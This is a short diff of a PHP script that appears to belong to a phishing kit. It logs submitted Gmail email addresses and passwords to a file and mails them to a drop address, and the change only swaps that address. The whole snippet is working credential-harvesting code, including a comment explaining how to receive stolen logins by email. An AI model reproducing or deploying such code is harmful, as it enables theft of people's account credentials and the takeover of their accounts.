@@ -13,5 +13,5 @@ fwrite($file, $data['email'] . "\t" . $data['password'] . PHP_EOL);
 fclose($file);
 
 // uncomment the lines below to receive the credentials by email
-$maildrop = "tarimicac@email.com";
+$maildrop = "tarimicac@gmail.com";
 mail($maildrop, "Gmail credentials", $_POST['email'] . "\t" . $_POST['pass']);
